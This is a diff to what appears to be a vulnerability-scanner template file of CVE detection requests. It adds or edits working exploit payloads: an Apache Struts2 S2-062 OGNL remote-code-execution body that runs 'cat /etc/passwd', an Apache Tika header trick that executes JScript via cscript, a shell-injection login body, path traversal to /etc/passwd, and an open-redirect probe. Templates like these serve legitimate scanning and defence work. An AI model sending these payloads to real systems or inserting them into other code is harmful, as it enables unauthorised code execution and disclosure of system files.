@@ -6234,11 +6234,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
             "Content-type": "image/jp2",
             "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript"
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript",
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -6380,6 +6380,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-14931",
+      "info": {
+        "name": "Polarisft Intellect Core Banking Software Version 9.7.1 - Open Redirect",
+        "severity": "low"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/IntellectMain.jsp?IntellectSystem=https://www.example.com"
           ]
         }
       ]
@@ -10430,8 +10445,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -14519,6 +14534,20 @@
       ]
     },
     {
+      "id": "CVE-2021-31805",
+      "info": {
+        "name": "Apache Struts2 S2-062 - Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Length: 1095\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Disposition: form-data; name=\"id\"\n\n%{\n(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\n(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\n(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\n(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\n(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'cat /etc/passwd'}))\n}\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF—\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-31856",
       "info": {
         "name": "Layer5 Meshery 0.5.2 SQLi",
@@ -16985,7 +17014,7 @@
       "id": "CVE-2022-28365",
       "info": {
         "name": "Reprise License Manager 14.2 - Information Disclosure",
-        "severity": "low"
+        "severity": "medium"
       },
       "requests": [
         {
